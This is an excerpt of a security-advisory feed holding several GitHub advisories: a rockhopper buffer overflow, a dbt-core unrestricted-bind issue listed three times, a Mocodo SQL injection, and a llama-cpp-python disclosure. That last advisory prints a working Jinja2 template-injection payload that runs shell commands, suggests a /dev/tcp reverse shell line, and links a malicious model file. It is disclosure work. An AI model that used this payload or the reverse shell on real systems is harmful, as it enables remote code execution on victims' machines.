            "content_html": "<p>A vulnerability, which was classified as critical, has been found in bwoodsend rockhopper up to 0.1.2. Affected by this issue is the function <code>count_rows</code> of the file <code>rockhopper/src/ragged_array.c</code> of the component Binary Parser. The manipulation of the argument raw leads to buffer overflow. Local access is required to approach this attack. Upgrading to version 0.2.0 is able to address this issue. The name of the patch is 1a15fad5e06ae693eb9b8908363d2c8ef455104e. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-266312.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-4969\">https://nvd.nist.gov/vuln/detail/CVE-2022-4969</a></li>\n<li><a href=\"https://github.com/bwoodsend/rockhopper/commit/1a15fad5e06ae693eb9b8908363d2c8ef455104e\">https://github.com/bwoodsend/rockhopper/commit/1a15fad5e06ae693eb9b8908363d2c8ef455104e</a></li>\n<li><a href=\"https://github.com/bwoodsend/rockhopper/releases/tag/v0.2.0\">https://github.com/bwoodsend/rockhopper/releases/tag/v0.2.0</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.266312\">https://vuldb.com/?ctiid.266312</a></li>\n<li><a href=\"https://vuldb.com/?id.266312\">https://vuldb.com/?id.266312</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4r4c-66gf-g9g5\">https://github.com/advisories/GHSA-4r4c-66gf-g9g5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4r4c-66gf-g9g5",
            "title": "[rockhopper] rockhopper Buffer Overflow vulnerability",
            "date_modified": "2024-05-28T21:22:46.000Z",
            "date_published": "2024-05-28T21:22:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4r4c-66gf-g9g5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Binding to <code>INADDR_ANY (0.0.0.0)</code> or <code>IN6ADDR_ANY (::)</code> exposes an application on all network interfaces, increasing the risk of unauthorized access.</p>\n<p>While doing some static analysis and code inspection, I found the following code binding a socket to <code>INADDR_ANY</code> by passing <code>\"\"</code> as the address. This effectively binds to any network interface on the local system, not just localhost (127.0.0.1). </p>\n<h3 id=\"details\">Details</h3>\n<p>As stated in the Python docs, a special form for address is accepted instead of a host address: <code>''</code> represents <code>INADDR_ANY</code>, equivalent to <code>\"0.0.0.0\"</code>. On systems with IPv6, '' represents <code>IN6ADDR_ANY</code>, which is equivalent to <code>\"::\"</code>. </p>\n<p><a href=\"https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39\">https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39</a></p>\n<p>The text around this code also imply the intention is to host docs only on localhost.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>To recreate, run the docs ServeTask.run() to stand up the HTTP server.  Then run <code>netstat</code> to see what addresses this process is bound.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>A user who serves docs on an unsecured public network, may unknowingly be hosting an unsecured (http) web site for any remote user/system to access on the same network.</p>\n<p>Further references:\n<a href=\"https://docs.python.org/3/library/socket.html#socket-families\">https://docs.python.org/3/library/socket.html#socket-families</a>\n<a href=\"https://docs.securesauce.dev/rules/PY030\">https://docs.securesauce.dev/rules/PY030</a>\n<a href=\"https://cwe.mitre.org/data/definitions/1327.html\">https://cwe.mitre.org/data/definitions/1327.html</a></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has has been mitigated in <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15\">dbt-core v1.6.15</a>, <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15\">dbt-core v1.7.15</a>, and <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1\">dbt-core v1.8.1</a> by binding to localhost explicitly by default in <code>dbt docs serve</code> (<a href=\"https://github.com/dbt-labs/dbt-core/issues/10209\">https://github.com/dbt-labs/dbt-core/issues/10209</a>).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-pmrx-695r-4349\">https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-pmrx-695r-4349</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36105\">https://nvd.nist.gov/vuln/detail/CVE-2024-36105</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/issues/10209\">https://github.com/dbt-labs/dbt-core/issues/10209</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/pull/10208\">https://github.com/dbt-labs/dbt-core/pull/10208</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/commit/0c08d7a19ad1740be3cb0b2e6d9d64f6537176f7\">https://github.com/dbt-labs/dbt-core/commit/0c08d7a19ad1740be3cb0b2e6d9d64f6537176f7</a></li>\n<li><a href=\"https://cwe.mitre.org/data/definitions/1327.html\">https://cwe.mitre.org/data/definitions/1327.html</a></li>\n<li><a href=\"https://docs.python.org/3/library/socket.html#socket-families\">https://docs.python.org/3/library/socket.html#socket-families</a></li>\n<li><a href=\"https://docs.securesauce.dev/rules/PY030\">https://docs.securesauce.dev/rules/PY030</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39\">https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmrx-695r-4349\">https://github.com/advisories/GHSA-pmrx-695r-4349</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmrx-695r-4349",
            "title": "[dbt-core] dbt allows Binding to an Unrestricted IP Address via socketsocket",
            "date_modified": "2024-05-28T21:19:15.000Z",
            "date_published": "2024-05-28T21:19:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmrx-695r-4349"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Binding to <code>INADDR_ANY (0.0.0.0)</code> or <code>IN6ADDR_ANY (::)</code> exposes an application on all network interfaces, increasing the risk of unauthorized access.</p>\n<p>While doing some static analysis and code inspection, I found the following code binding a socket to <code>INADDR_ANY</code> by passing <code>\"\"</code> as the address. This effectively binds to any network interface on the local system, not just localhost (127.0.0.1). </p>\n<h3 id=\"details\">Details</h3>\n<p>As stated in the Python docs, a special form for address is accepted instead of a host address: <code>''</code> represents <code>INADDR_ANY</code>, equivalent to <code>\"0.0.0.0\"</code>. On systems with IPv6, '' represents <code>IN6ADDR_ANY</code>, which is equivalent to <code>\"::\"</code>. </p>\n<p><a href=\"https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39\">https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39</a></p>\n<p>The text around this code also imply the intention is to host docs only on localhost.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>To recreate, run the docs ServeTask.run() to stand up the HTTP server.  Then run <code>netstat</code> to see what addresses this process is bound.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>A user who serves docs on an unsecured public network, may unknowingly be hosting an unsecured (http) web site for any remote user/system to access on the same network.</p>\n<p>Further references:\n<a href=\"https://docs.python.org/3/library/socket.html#socket-families\">https://docs.python.org/3/library/socket.html#socket-families</a>\n<a href=\"https://docs.securesauce.dev/rules/PY030\">https://docs.securesauce.dev/rules/PY030</a>\n<a href=\"https://cwe.mitre.org/data/definitions/1327.html\">https://cwe.mitre.org/data/definitions/1327.html</a></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has has been mitigated in <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15\">dbt-core v1.6.15</a>, <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15\">dbt-core v1.7.15</a>, and <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1\">dbt-core v1.8.1</a> by binding to localhost explicitly by default in <code>dbt docs serve</code> (<a href=\"https://github.com/dbt-labs/dbt-core/issues/10209\">https://github.com/dbt-labs/dbt-core/issues/10209</a>).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-pmrx-695r-4349\">https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-pmrx-695r-4349</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36105\">https://nvd.nist.gov/vuln/detail/CVE-2024-36105</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/issues/10209\">https://github.com/dbt-labs/dbt-core/issues/10209</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/pull/10208\">https://github.com/dbt-labs/dbt-core/pull/10208</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/commit/0c08d7a19ad1740be3cb0b2e6d9d64f6537176f7\">https://github.com/dbt-labs/dbt-core/commit/0c08d7a19ad1740be3cb0b2e6d9d64f6537176f7</a></li>\n<li><a href=\"https://cwe.mitre.org/data/definitions/1327.html\">https://cwe.mitre.org/data/definitions/1327.html</a></li>\n<li><a href=\"https://docs.python.org/3/library/socket.html#socket-families\">https://docs.python.org/3/library/socket.html#socket-families</a></li>\n<li><a href=\"https://docs.securesauce.dev/rules/PY030\">https://docs.securesauce.dev/rules/PY030</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39\">https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmrx-695r-4349\">https://github.com/advisories/GHSA-pmrx-695r-4349</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmrx-695r-4349",
            "title": "[dbt-core] dbt allows Binding to an Unrestricted IP Address via socketsocket",
            "date_modified": "2024-05-28T21:19:15.000Z",
            "date_published": "2024-05-28T21:19:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmrx-695r-4349"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Binding to <code>INADDR_ANY (0.0.0.0)</code> or <code>IN6ADDR_ANY (::)</code> exposes an application on all network interfaces, increasing the risk of unauthorized access.</p>\n<p>While doing some static analysis and code inspection, I found the following code binding a socket to <code>INADDR_ANY</code> by passing <code>\"\"</code> as the address. This effectively binds to any network interface on the local system, not just localhost (127.0.0.1). </p>\n<h3 id=\"details\">Details</h3>\n<p>As stated in the Python docs, a special form for address is accepted instead of a host address: <code>''</code> represents <code>INADDR_ANY</code>, equivalent to <code>\"0.0.0.0\"</code>. On systems with IPv6, '' represents <code>IN6ADDR_ANY</code>, which is equivalent to <code>\"::\"</code>. </p>\n<p><a href=\"https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39\">https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39</a></p>\n<p>The text around this code also imply the intention is to host docs only on localhost.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>To recreate, run the docs ServeTask.run() to stand up the HTTP server.  Then run <code>netstat</code> to see what addresses this process is bound.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>A user who serves docs on an unsecured public network, may unknowingly be hosting an unsecured (http) web site for any remote user/system to access on the same network.</p>\n<p>Further references:\n<a href=\"https://docs.python.org/3/library/socket.html#socket-families\">https://docs.python.org/3/library/socket.html#socket-families</a>\n<a href=\"https://docs.securesauce.dev/rules/PY030\">https://docs.securesauce.dev/rules/PY030</a>\n<a href=\"https://cwe.mitre.org/data/definitions/1327.html\">https://cwe.mitre.org/data/definitions/1327.html</a></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has has been mitigated in <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15\">dbt-core v1.6.15</a>, <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15\">dbt-core v1.7.15</a>, and <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1\">dbt-core v1.8.1</a> by binding to localhost explicitly by default in <code>dbt docs serve</code> (<a href=\"https://github.com/dbt-labs/dbt-core/issues/10209\">https://github.com/dbt-labs/dbt-core/issues/10209</a>).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-pmrx-695r-4349\">https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-pmrx-695r-4349</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36105\">https://nvd.nist.gov/vuln/detail/CVE-2024-36105</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/issues/10209\">https://github.com/dbt-labs/dbt-core/issues/10209</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/pull/10208\">https://github.com/dbt-labs/dbt-core/pull/10208</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/commit/0c08d7a19ad1740be3cb0b2e6d9d64f6537176f7\">https://github.com/dbt-labs/dbt-core/commit/0c08d7a19ad1740be3cb0b2e6d9d64f6537176f7</a></li>\n<li><a href=\"https://cwe.mitre.org/data/definitions/1327.html\">https://cwe.mitre.org/data/definitions/1327.html</a></li>\n<li><a href=\"https://docs.python.org/3/library/socket.html#socket-families\">https://docs.python.org/3/library/socket.html#socket-families</a></li>\n<li><a href=\"https://docs.securesauce.dev/rules/PY030\">https://docs.securesauce.dev/rules/PY030</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39\">https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmrx-695r-4349\">https://github.com/advisories/GHSA-pmrx-695r-4349</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmrx-695r-4349",
            "title": "[dbt-core] dbt allows Binding to an Unrestricted IP Address via socketsocket",
            "date_modified": "2024-05-28T21:19:15.000Z",
            "date_published": "2024-05-28T21:19:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmrx-695r-4349"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mocodo Mocodo Online 4.2.6 and below does not properly sanitize the <code>sql_case</code> input field in <code>/web/generate.php</code>, allowing remote attackers to execute arbitrary SQL commands and potentially command injection, leading to remote code execution (RCE) under certain conditions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35374\">https://nvd.nist.gov/vuln/detail/CVE-2024-35374</a></li>\n<li><a href=\"https://github.com/laowantong/mocodo/commit/f9368df28518b6c4a92fd207c260f1978ec34d6e\">https://github.com/laowantong/mocodo/commit/f9368df28518b6c4a92fd207c260f1978ec34d6e</a></li>\n<li><a href=\"https://chocapikk.com/posts/2024/mocodo-vulnerabilities\">https://chocapikk.com/posts/2024/mocodo-vulnerabilities</a></li>\n<li><a href=\"https://github.com/laowantong/mocodo/blob/11ca879060a68e06844058cd969c6379214cc2a8/web/generate.php#L104-L158\">https://github.com/laowantong/mocodo/blob/11ca879060a68e06844058cd969c6379214cc2a8/web/generate.php#L104-L158</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j6cv-98jx-mrwr\">https://github.com/advisories/GHSA-j6cv-98jx-mrwr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j6cv-98jx-mrwr",
            "title": "[mocodo] Mocodo vulnerable to SQL injection in `/web/generate.php`",
            "date_modified": "2024-05-28T20:20:38.000Z",
            "date_published": "2024-05-28T20:20:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j6cv-98jx-mrwr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"description\">Description</h2>\n<p><code>llama-cpp-python</code> depends on class <code>Llama</code> in <code>llama.py</code> to load <code>.gguf</code> llama.cpp or Latency Machine Learning Models. The <code>__init__</code> constructor built in the <code>Llama</code> takes several parameters to configure the loading and running of the model. Other than <code>NUMA, LoRa settings</code>, <code>loading tokenizers,</code> and <code>hardware settings</code>, <code>__init__</code> also loads the <code>chat template</code> from targeted <code>.gguf</code> 's Metadata and furtherly parses it to <code>llama_chat_format.Jinja2ChatFormatter.to_chat_handler()</code> to construct the <code>self.chat_handler</code> for this model. Nevertheless, <code>Jinja2ChatFormatter</code> parse the <code>chat template</code> within the Metadate with sandbox-less <code>jinja2.Environment</code>, which is furthermore rendered in <code>__call__</code> to construct the <code>prompt</code> of interaction. This allows <code>jinja2</code> Server Side Template Injection which leads to RCE by a carefully constructed payload.</p>\n<h2 id=\"source-to-sink\">Source-to-Sink</h2>\n<h3 id=\"llamapy---class-llama---__init__\"><code>llama.py</code> -&gt; <code>class Llama</code> -&gt; <code>__init__</code>:</h3>\n<pre><code class=\"language-python\">class Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n        # lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n        # Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n</code></pre>\n<p>In <code>llama.py</code>, <code>llama-cpp-python</code> defined the fundamental class for model initialization parsing (Including <code>NUMA, LoRa settings</code>, <code>loading tokenizers,</code> and stuff ). In our case, we will be focusing on the parts where it processes <code>metadata</code>; it first checks if <code>chat_format</code> and <code>chat_handler</code> are <code>None</code> and checks if the key <code>tokenizer.chat_template</code> exists in the metadata dictionary <code>self.metadata</code>. If it exists, it will try to guess the <code>chat format</code> from the <code>metadata</code>. If the guess fails, it will get the value of <code>chat_template</code> directly from <code>self.metadata.self.metadata</code> is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the <code>chat_template</code> is parsed into <code>llama_chat_format.Jinja2ChatFormatter</code> as params which furthermore stored the <code>to_chat_handler()</code> as <code>chat_handler</code></p>\n<h3 id=\"llama_chat_formatpy---jinja2chatformatter\"><code>llama_chat_format.py</code> -&gt; <code>Jinja2ChatFormatter</code>:</h3>\n<p><code>self._environment =  jinja2.Environment( -&gt; from_string(self.template) -&gt; self._environment.render(</code></p>\n<pre><code class=\"language-python\">class ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -&gt; ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -&gt; ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n</code></pre>\n<p>As we can see in <code>llama_chat_format.py</code> -&gt; <code>Jinja2ChatFormatter</code>, the constructor <code>__init__</code> initialized required <code>members</code> inside of the class; Nevertheless, focusing on this line:</p>\n<pre><code class=\"language-python\">        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n</code></pre>\n<p>Fun thing here: <code>llama_cpp_python</code> directly loads the <code>self.template</code> (<code>self.template = template</code> which is the <code>chat template</code> located in the <code>Metadate</code> that is parsed as a param) via <code>jinja2.Environment.from_string(</code> without setting any sandbox flag or using the protected <code>immutablesandboxedenvironment </code>class. This is extremely unsafe since the attacker can implicitly tell <code>llama_cpp_python</code> to load malicious <code>chat template</code> which is furthermore rendered in the <code>__call__</code> constructor, allowing RCEs or Denial-of-Service since <code>jinja2</code>'s renderer evaluates embed codes like <code>eval()</code>, and we can utilize expose method by exploring the attribution such as <code>__globals__</code>, <code>__subclasses__</code> of pretty much anything.</p>\n<pre><code class=\"language-python\">    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -&gt; ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n</code></pre>\n<h2 id=\"exploiting\">Exploiting</h2>\n<p>For our exploitation, we first downloaded <a href=\"https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf\">qwen1_5-0_5b-chat-q2_k.gguf</a> of <code>Qwen/Qwen1.5-0.5B-Chat-GGUF</code> on <code>huggingface</code> as the base of the exploitation, by importing the file to <code>Hex-compatible</code> editors (In my case I used the built-in <code>Hex editor</code> or <code>vscode</code>), you can try to search for key <code>chat_template</code> (imported as <code>template = self.metadata[\"tokenizer.chat_template\"]</code> in <code>llama-cpp-python</code>):</p>\n<img style=\"zoom: 25%;\" alt=\"image-20240502180804562\" src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\">\n\n<p><code>qwen1_5-0_5b-chat-q2_k.gguf</code> appears to be using the OG <code>role+message</code> and using the fun <code>jinja2</code> syntax. By first replacing the original <code>chat_template</code> in <code>\\x00</code>, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression <code>().__class__.__base__.__subclasses__()</code> retrieves a list of all subclasses of the basic <code>object</code> class and then we check if its <code>warning</code> by <code>if \"warning\" in x.__name__</code>, if it is , we access its module via the <code>_module</code> attribute then access Python's built-in functions through <code>__builtins__</code> and uses the <code>__import__</code> function to import the <code>os</code> module and finally we called <code>os.popen</code> to <code>touch /tmp/retr0reg</code>, create an empty file call <code>retr0reg</code> under <code>/tmp/</code></p>\n<pre><code class=\"language-python\">{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n</code></pre>\n<p>in real life exploiting instance, we can change <code>touch /tmp/retr0reg</code> into arbitrary codes like <code>sh -i &gt;&amp; /dev/tcp/&lt;HOST&gt;/&lt;PORT&gt; 0&gt;&amp;1</code> to create a reverse shell connection to specified host, in our case we are using <code>touch /tmp/retr0reg</code> to showcase the exploitability of this vulnerability.</p>\n<img style=\"zoom:50%;\" alt=\"image-20240502200909127\" src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\">\n\n<p>After these steps, we got ourselves a malicious model with an embedded payload in <code>chat_template</code> of the <code>metahead</code>, in which will be parsed and rendered by <code>llama.py:class Llama:init -&gt;  self.chat_handler </code>-&gt; <code>llama_chat_format.py:Jinja2ChatFormatter:init -&gt;  self._environment = jinja2.Environment(</code> -&gt; ``llama_chat_format.py:Jinja2ChatFormatter:call -&gt; self._environment.render(`</p>\n<p><em>(The uploaded malicious model file is in <a href=\"https://huggingface.co/Retr0REG/Whats-up-gguf\">https://huggingface.co/Retr0REG/Whats-up-gguf</a> )</em></p>\n<pre><code class=\"language-python\">from llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n</code></pre>\n<p>Now when the model is loaded whether as <code> Llama.from_pretrained</code> or <code>Llama</code> and chatted, our malicious code in the <code>chat_template</code> of the <code>metahead</code> will be triggered and execute arbitrary code. </p>\n<p>PoC video here: <a href=\"https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\">https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/abetlen/llama-cpp-python/security/advisories/GHSA-56xg-wfcc-g829\">https://github.com/abetlen/llama-cpp-python/security/advisories/GHSA-56xg-wfcc-g829</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34359\">https://nvd.nist.gov/vuln/detail/CVE-2024-34359</a></li>\n<li><a href=\"https://github.com/abetlen/llama-cpp-python/commit/b454f40a9a1787b2b5659cd2cb00819d983185df\">https://github.com/abetlen/llama-cpp-python/commit/b454f40a9a1787b2b5659cd2cb00819d983185df</a></li>\n<li><a 